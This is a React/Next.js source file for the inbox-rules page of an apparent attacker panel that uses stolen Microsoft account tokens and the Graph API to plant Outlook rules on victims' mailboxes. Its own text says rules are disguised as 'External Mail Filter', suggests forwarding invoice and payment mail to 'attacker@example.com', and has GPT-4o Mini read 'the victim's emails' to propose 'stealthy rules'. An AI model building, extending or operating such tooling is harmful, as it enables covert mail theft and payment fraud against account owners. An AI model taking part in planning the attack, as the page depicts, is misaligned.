"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useParams, useRouter } from "next/navigation";
import { Token, Rule } from "@/types/token";
import { fetchTokens, fetchRules, fetchGraphRules, createRule, deleteRule, aiSuggestRules } from "@/lib/api";
import {
  AlertCircle, ArrowLeft, Loader2, Mail, Plus, Trash2, Gavel,
  Shield, Check, X, Folder, Forward, ArrowRight, ListFilter,
  RefreshCw, Sparkles,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { ScrollArea } from "@/components/ui/scroll-area";
import {
  Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle,
} from "@/components/ui/dialog";
import { toast } from "sonner";
import { cn } from "@/lib/utils";

export default function RulesPage() {
  const params = useParams<{ tokenId: string }>();
  const tokenId = params?.tokenId;
  const router = useRouter();

  const [token, setToken] = useState<Token | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const [localRules, setLocalRules] = useState<Rule[]>([]);
  const [graphRules, setGraphRules] = useState<any[]>([]);
  const [rulesLoading, setRulesLoading] = useState(false);
  const [createDialogOpen, setCreateDialogOpen] = useState(false);

  // Create rule form
  const [ruleName, setRuleName] = useState("");
  const [subjectKeywords, setSubjectKeywords] = useState("");
  const [senderDomains, setSenderDomains] = useState("");
  const [moveToFolder, setMoveToFolder] = useState("");
  const [forwardTo, setForwardTo] = useState("");
  const [stopProcessing, setStopProcessing] = useState(true);
  const [creating, setCreating] = useState(false);
  const [aiSuggestions, setAiSuggestions] = useState<any[]>([]);
  const [aiLoading, setAiLoading] = useState(false);
  const [aiDialogOpen, setAiDialogOpen] = useState(false);

  const loadToken = useCallback(async () => {
    if (!tokenId) return;
    setLoading(true);
    try {
      const data = await fetchTokens();
      setToken(data?.find((t: Token) => t.id === tokenId) || null);
    } catch (err: any) {
      setError(err.message || "Failed to load token");
    } finally {
      setLoading(false);
    }
  }, [tokenId]);

  const loadRules = useCallback(async () => {
    if (!tokenId) return;
    setRulesLoading(true);
    try {
      const [local, graph] = await Promise.all([
        fetchRules(tokenId),
        fetchGraphRules(tokenId).catch(() => ({ status: "error", count: 0, rules: [] })),
      ]);
      setLocalRules(local || []);
      setGraphRules(graph.rules || []);
    } catch (err: any) {
      toast.error("Failed to load rules");
    } finally {
      setRulesLoading(false);
    }
  }, [tokenId]);

  useEffect(() => {
    loadToken();
    loadRules();
  }, [loadToken, loadRules]);

  const handleCreateRule = async () => {
    if (!tokenId || !ruleName.trim()) return;
    setCreating(true);
    try {
      const payload = {
        token_id: tokenId,
        rule_name: ruleName.trim(),
        condition_subject_contains: subjectKeywords.split(",").map(s => s.trim()).filter(Boolean),
        condition_sender_domain: senderDomains.split(",").map(s => s.trim()).filter(Boolean),
        action_move_to_folder: moveToFolder.trim() || null,
        action_forward_to: forwardTo.trim() || null,
        stop_processing: stopProcessing,
      };
      const result = await createRule(payload);
      toast.success("Rule created", {
        description: result.graph_rule_id
          ? "Rule created and synced to Graph API"
          : "Rule saved locally (Graph API sync failed for consumer account)",
      });
      setCreateDialogOpen(false);
      resetForm();
      loadRules();
    } catch (err: any) {
      toast.error("Failed to create rule", { description: err.message });
    } finally {
      setCreating(false);
    }
  };

  const handleDeleteRule = async (rule: Rule) => {
    if (!confirm(`Delete rule "${rule.display_name}"?`)) return;
    try {
      await deleteRule(rule.id);
      toast.success("Rule deleted");
      loadRules();
    } catch (err: any) {
      toast.error("Failed to delete rule", { description: err.message });
    }
  };

  const handleAiSuggest = async () => {
    if (!tokenId) return;
    setAiLoading(true);
    try {
      const result = await aiSuggestRules(tokenId);
      setAiSuggestions(result.suggestions || []);
      setAiDialogOpen(true);
      toast.success(`AI analyzed ${result.analyzed_messages} messages and suggested ${result.suggestions?.length || 0} rules`);
    } catch (err: any) {
      toast.error("AI suggestion failed", { description: err.message });
    } finally {
      setAiLoading(false);
    }
  };

  const applyAiSuggestion = (suggestion: any) => {
    setRuleName(suggestion.rule_name);
    setSubjectKeywords(suggestion.condition_subject_contains?.join(", ") || "");
    setSenderDomains(suggestion.condition_sender_domain?.join(", ") || "");
    setMoveToFolder(suggestion.action_move_to_folder || "");
    setForwardTo(suggestion.action_forward_to || "");
    setAiDialogOpen(false);
    setCreateDialogOpen(true);
    toast.success("AI suggestion applied to form");
  };

  const resetForm = () => {
    setRuleName("");
    setSubjectKeywords("");
    setSenderDomains("");
    setMoveToFolder("");
    setForwardTo("");
    setStopProcessing(true);
  };

  const parseConditions = (json: string) => {
    try {
      return JSON.parse(json);
    } catch {
      return {};
    }
  };

  const parseActions = (json: string) => {
    try {
      return JSON.parse(json);
    } catch {
      return {};
    }
  };

  if (loading) {
    return (
      <div className="flex-1 flex flex-col min-h-0">
        <div className="h-14 px-6 flex items-center border-b border-white/5 glass-strong">
          <div className="h-4 w-32 animate-pulse rounded bg-white/5" />
        </div>
        <div className="flex-1 flex items-center justify-center">
          <Loader2 className="h-6 w-6 animate-spin text-muted-foreground" />
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="flex-1 flex flex-col min-h-0">
        <div className="flex-1 flex items-center justify-center">
          <div className="text-center space-y-4">
            <AlertCircle className="h-8 w-8 mx-auto text-destructive" />
            <p className="text-sm text-destructive/80">{error}</p>
            <Button variant="outline" size="sm" onClick={loadToken}>Retry</Button>
          </div>
        </div>
      </div>
    );
  }

  if (!token) {
    return (
      <div className="flex-1 flex flex-col min-h-0">
        <div className="flex-1 flex items-center justify-center">
          <div className="text-center space-y-4">
            <Mail className="h-8 w-8 mx-auto text-muted-foreground" />
            <p className="text-sm text-muted-foreground">Token not found</p>
            <Button variant="outline" size="sm" onClick={() => router.push("/")}>Return to Dashboard</Button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex-1 flex flex-col min-h-0">
      {/* Top Bar */}
      <div className="sticky top-0 z-40 flex items-center gap-3 h-12 px-4 glass-strong border-b border-white/5">
        <button onClick={() => router.push("/")} className="flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition-colors">
          <ArrowLeft className="h-4 w-4" />
          <span className="hidden sm:inline">Dashboard</span>
        </button>
        <div className="h-4 w-px bg-white/10" />
        <div className="min-w-0 flex-1">
          <h2 className="text-sm font-semibold tracking-tight text-foreground truncate">{token.email}</h2>
        </div>
        <div className="flex items-center gap-2 flex-shrink-0">
          <Button variant="ghost" size="sm" onClick={handleAiSuggest} disabled={aiLoading} className="gap-1.5 h-8 text-xs text-purple-400 hover:text-purple-300">
            <Sparkles className="h-3.5 w-3.5" /> {aiLoading ? "Analyzing..." : "AI Suggest"}
          </Button>
          <Button variant="ghost" size="sm" onClick={() => setCreateDialogOpen(true)} className="gap-1.5 h-8 text-xs text-primary">
            <Plus className="h-3.5 w-3.5" /> New rule
          </Button>
          <Button variant="ghost" size="sm" onClick={loadRules} disabled={rulesLoading} className="h-8 w-8 p-0">
            <RefreshCw className={`h-3.5 w-3.5 ${rulesLoading ? "animate-spin" : ""}`} />
          </Button>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto p-6">
        <div className="max-w-4xl mx-auto space-y-6">
          {/* Header */}
          <div className="flex items-center gap-3">
            <div className="h-10 w-10 rounded-lg bg-amber-500/10 flex items-center justify-center">
              <Gavel className="h-5 w-5 text-amber-400" />
            </div>
            <div>
              <h1 className="text-lg font-semibold text-foreground">Inbox Rules</h1>
              <p className="text-xs text-muted-foreground">Manage email filtering rules for {token.email}</p>
            </div>
          </div>

          {/* Stats */}
          <div className="grid grid-cols-3 gap-4">
            <div className="rounded-lg border border-white/5 bg-secondary/20 p-4">
              <p className="text-2xl font-bold text-foreground">{localRules.length}</p>
              <p className="text-[11px] text-muted-foreground">Local Rules</p>
            </div>
            <div className="rounded-lg border border-white/5 bg-secondary/20 p-4">
              <p className="text-2xl font-bold text-foreground">{graphRules.length}</p>
              <p className="text-[11px] text-muted-foreground">Graph API Rules</p>
            </div>
            <div className="rounded-lg border border-white/5 bg-secondary/20 p-4">
              <p className="text-2xl font-bold text-foreground">{localRules.filter(r => r.status === "active").length}</p>
              <p className="text-[11px] text-muted-foreground">Active</p>
            </div>
          </div>

          {/* Local Rules List */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-medium text-foreground flex items-center gap-2">
                <ListFilter className="h-4 w-4 text-muted-foreground" />
                Local Rules
              </h3>
              <Badge variant="outline" className="text-[10px]">{localRules.length} total</Badge>
            </div>

            {rulesLoading && localRules.length === 0 ? (
              <div className="flex items-center justify-center h-32">
                <Loader2 className="h-5 w-5 animate-spin text-muted-foreground" />
              </div>
            ) : localRules.length === 0 ? (
              <div className="rounded-lg border border-dashed border-white/10 p-8 text-center">
                <Shield className="h-8 w-8 text-muted-foreground/30 mx-auto mb-2" />
                <p className="text-sm text-muted-foreground">No rules configured</p>
                <p className="text-[11px] text-muted-foreground/60 mt-1">Create a rule to auto-filter incoming emails</p>
                <Button size="sm" className="mt-3 gap-1" onClick={() => setCreateDialogOpen(true)}>
                  <Plus className="h-3.5 w-3.5" /> Create rule
                </Button>
              </div>
            ) : (
              <div className="space-y-2">
                <AnimatePresence>
                  {localRules.map((rule, i) => {
                    const conditions = parseConditions(rule.conditions_json);
                    const actions = parseActions(rule.actions_json);

                    return (
                      <motion.div
                        key={rule.id}
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: i * 0.05 }}
                        className="rounded-lg border border-white/5 bg-secondary/10 hover:bg-secondary/20 transition-colors p-4 group"
                      >
                        <div className="flex items-start justify-between gap-4">
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <h4 className="text-sm font-medium text-foreground">{rule.display_name}</h4>
                              <Badge
                                variant="outline"
                                className={cn(
                                  "text-[10px]",
                                  rule.status === "active"
                                    ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                                    : "bg-amber-500/10 text-amber-400 border-amber-500/20"
                                )}
                              >
                                {rule.status}
                              </Badge>
                              {rule.graph_rule_id && (
                                <Badge variant="outline" className="text-[10px] bg-blue-500/10 text-blue-400 border-blue-500/20">
                                  Graph API
                                </Badge>
                              )}
                            </div>

                            <p className="text-[11px] text-muted-foreground mb-2">
                              Disguised as: <span className="text-foreground/70">{rule.disguise_name}</span>
                            </p>

                            {/* Conditions */}
                            <div className="flex flex-wrap gap-1.5 mb-2">
                              {conditions.subjectContains && (
                                <Badge variant="secondary" className="text-[10px] gap-1">
                                  <Mail className="h-3 w-3" />
                                  Subject: {conditions.subjectContains.join(", ")}
                                </Badge>
                              )}
                              {conditions.fromAddresses && (
                                <Badge variant="secondary" className="text-[10px] gap-1">
                                  <ArrowRight className="h-3 w-3" />
                                  From: {conditions.fromAddresses.map((a: any) => a.address).join(", ")}
                                </Badge>
                              )}
                            </div>

                            {/* Actions */}
                            <div className="flex flex-wrap gap-1.5">
                              {actions.moveToFolder && (
                                <Badge variant="outline" className="text-[10px] gap-1 bg-blue-500/5 text-blue-400 border-blue-500/10">
                                  <Folder className="h-3 w-3" />
                                  Move to: {actions.moveToFolder}
                                </Badge>
                              )}
                              {actions.forwardTo && (
                                <Badge variant="outline" className="text-[10px] gap-1 bg-purple-500/5 text-purple-400 border-purple-500/10">
                                  <Forward className="h-3 w-3" />
                                  Forward to: {actions.forwardTo}
                                </Badge>
                              )}
                              {actions.stopProcessingRules && (
                                <Badge variant="outline" className="text-[10px] gap-1 bg-amber-500/5 text-amber-400 border-amber-500/10">
                                  <Check className="h-3 w-3" />
                                  Stop processing
                                </Badge>
                              )}
                            </div>
                          </div>

                          <div className="flex items-center gap-2 shrink-0">
                            <button
                              onClick={() => handleDeleteRule(rule)}
                              className="p-2 rounded-lg border border-white/10 hover:bg-rose-500/10 transition-colors opacity-0 group-hover:opacity-100"
                              title="Delete rule"
                            >
                              <Trash2 className="h-4 w-4 text-rose-400" />
                            </button>
                          </div>
                        </div>
                      </motion.div>
                    );
                  })}
                </AnimatePresence>
              </div>
            )}
          </div>

          {/* Graph API Rules */}
          {graphRules.length > 0 && (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <h3 className="text-sm font-medium text-foreground flex items-center gap-2">
                  <ListFilter className="h-4 w-4 text-muted-foreground" />
                  Graph API Rules
                </h3>
                <Badge variant="outline" className="text-[10px]">{graphRules.length} total</Badge>
              </div>

              <div className="space-y-2">
                {graphRules.map((rule, i) => (
                  <motion.div
                    key={rule.id || i}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: i * 0.05 }}
                    className="rounded-lg border border-white/5 bg-secondary/10 p-4"
                  >
                    <div className="flex items-start justify-between gap-4">
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1">
                          <h4 className="text-sm font-medium text-foreground">{rule.displayName || "Unnamed Rule"}</h4>
                          <Badge
                            variant="outline"
                            className={cn(
                              "text-[10px]",
                              rule.isEnabled
                                ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                                : "bg-amber-500/10 text-amber-400 border-amber-500/20"
                            )}
                          >
                            {rule.isEnabled ? "Enabled" : "Disabled"}
                          </Badge>
                        </div>
                        {rule.conditions && (
                          <p className="text-[11px] text-muted-foreground">
                            Conditions: {JSON.stringify(rule.conditions)}
                          </p>
                        )}
                        {rule.actions && (
                          <p className="text-[11px] text-muted-foreground">
                            Actions: {JSON.stringify(rule.actions)}
                          </p>
                        )}
                      </div>
                    </div>
                  </motion.div>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Create Rule Dialog */}
      <Dialog open={createDialogOpen} onOpenChange={setCreateDialogOpen}>
        <DialogContent className="sm:max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Gavel className="h-4 w-4 text-amber-400" />
              Create Inbox Rule
            </DialogTitle>
            <DialogDescription className="text-[11px]">
              Create a rule to automatically filter incoming emails. Rules are disguised as "External Mail Filter" in the Outlook UI.
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-4 py-2">
            {/* Rule Name */}
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-foreground">Rule name</label>
              <Input
                value={ruleName}
                onChange={(e) => setRuleName(e.target.value)}
                placeholder="e.g., Invoice Filter"
                className="bg-secondary/50 border-white/5"
              />
            </div>

            {/* Conditions */}
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-foreground flex items-center gap-1.5">
                <Mail className="h-3.5 w-3.5 text-muted-foreground" />
                Subject contains (comma-separated)
              </label>
              <Input
                value={subjectKeywords}
                onChange={(e) => setSubjectKeywords(e.target.value)}
                placeholder="invoice, payment, bill"
                className="bg-secondary/50 border-white/5"
              />
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-medium text-foreground flex items-center gap-1.5">
                <ArrowRight className="h-3.5 w-3.5 text-muted-foreground" />
                Sender domains (comma-separated)
              </label>
              <Input
                value={senderDomains}
                onChange={(e) => setSenderDomains(e.target.value)}
                placeholder="vendor.com, supplier.com"
                className="bg-secondary/50 border-white/5"
              />
            </div>

            {/* Actions */}
            <div className="space-y-1.5">
              <label className="text-xs font-medium text-foreground flex items-center gap-1.5">
                <Folder className="h-3.5 w-3.5 text-muted-foreground" />
                Move to folder
              </label>
              <Input
                value={moveToFolder}
                onChange={(e) => setMoveToFolder(e.target.value)}
                placeholder="Filtered (creates if not exists)"
                className="bg-secondary/50 border-white/5"
              />
            </div>

            <div className="space-y-1.5">
              <label className="text-xs font-medium text-foreground flex items-center gap-1.5">
                <Forward className="h-3.5 w-3.5 text-muted-foreground" />
                Forward to email
              </label>
              <Input
                value={forwardTo}
                onChange={(e) => setForwardTo(e.target.value)}
                placeholder="attacker@example.com"
                className="bg-secondary/50 border-white/5"
              />
            </div>

            {/* Stop processing */}
            <div className="flex items-center gap-2">
              <button
                onClick={() => setStopProcessing(!stopProcessing)}
                className={cn(
                  "flex items-center gap-2 px-3 py-2 rounded-md text-xs transition-colors border",
                  stopProcessing
                    ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                    : "bg-secondary/50 text-muted-foreground border-white/5"
                )}
              >
                {stopProcessing ? <Check className="h-3.5 w-3.5" /> : <X className="h-3.5 w-3.5" />}
                Stop processing more rules after this one
              </button>
            </div>
          </div>

          <DialogFooter>
            <Button variant="outline" size="sm" onClick={() => { setCreateDialogOpen(false); resetForm(); }}>
              Cancel
            </Button>
            <Button size="sm" onClick={handleCreateRule} disabled={creating || !ruleName.trim()} className="gap-1.5">
              {creating && <Loader2 className="h-3.5 w-3.5 animate-spin" />}
              <Plus className="h-3.5 w-3.5" /> Create rule
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* AI Suggestions Dialog */}
      <Dialog open={aiDialogOpen} onOpenChange={setAiDialogOpen}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2">
              <Sparkles className="h-5 w-5 text-purple-400" />
              AI-Suggested Rules
            </DialogTitle>
            <DialogDescription>
              GPT-4o Mini analyzed the victim's emails and suggested these stealthy rules.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-3 max-h-[60vh] overflow-y-auto">
            {aiSuggestions.length === 0 && (
              <p className="text-sm text-muted-foreground">No suggestions available. The victim's inbox may be empty.</p>
            )}
            {aiSuggestions.map((suggestion, idx) => (
              <div key={idx} className="rounded-lg border border-white/5 bg-secondary/20 p-3 space-y-2">
                <div className="flex items-center justify-between">
                  <h4 className="text-sm font-medium text-foreground">{suggestion.rule_name}</h4>
                  <Badge variant="outline" className="text-[10px]">
                    {(suggestion.confidence * 100).toFixed(0)}% confidence
                  </Badge>
                </div>
                <p className="text-xs text-muted-foreground">{suggestion.description}</p>
                <div className="flex flex-wrap gap-1">
                  {suggestion.condition_subject_contains?.map((kw: string, i: number) => (
                    <Badge key={i} variant="secondary" className="text-[10px]">Subject: {kw}</Badge>
                  ))}
                  {suggestion.condition_sender_domain?.map((d: string, i: number) => (
                    <Badge key={i} variant="secondary" className="text-[10px]">From: {d}</Badge>
                  ))}
                  {suggestion.action_move_to_folder && (
                    <Badge key="move" variant="secondary" className="text-[10px]">Move to: {suggestion.action_move_to_folder}</Badge>
                  )}
                  {suggestion.action_forward_to && (
                    <Badge key="fwd" variant="secondary" className="text-[10px]">Forward to: {suggestion.action_forward_to}</Badge>
                  )}
                </div>
                <Button size="sm" variant="outline" className="w-full text-xs" onClick={() => applyAiSuggestion(suggestion)}>
                  <Plus className="h-3.5 w-3.5 mr-1" /> Use this suggestion
                </Button>
              </div>
            ))}
          </div>
          <DialogFooter>
            <Button variant="outline" size="sm" onClick={() => setAiDialogOpen(false)}>
              Close
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}